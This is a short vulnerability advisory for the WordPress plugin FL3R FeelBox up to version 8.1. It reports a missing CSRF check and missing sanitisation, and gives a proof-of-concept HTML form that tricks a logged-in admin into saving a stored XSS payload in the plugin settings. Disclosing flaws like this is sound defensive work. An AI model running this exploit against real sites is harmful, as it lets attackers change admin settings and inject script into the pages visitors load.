## WordPress Plugin Vulnerabilities

# FL3R FeelBox <= 8.1 - Settings Update via CSRF to Stored XSS

### Description

The plugin does not have CSRF check when updating its settings, and is missing sanitisation as well as escaping, which could allow attackers to make logged in admin add Stored XSS payloads via a CSRF attack

### Proof of Concept

Make a logged in admin open a page containing the HTML code below
<form action="https://example.com/wp-admin/options-general.php?page=feelbox" method="POST">
<input type="text" name="feelbox\_submit\_hidden" value="Y">
<input type="text" name="fl3rfeelboxtitle" value='Do you like this post?"><img src onerror=alert(/XSS/)>'>
<input type="submit" name="submit" value="submit">
</form>
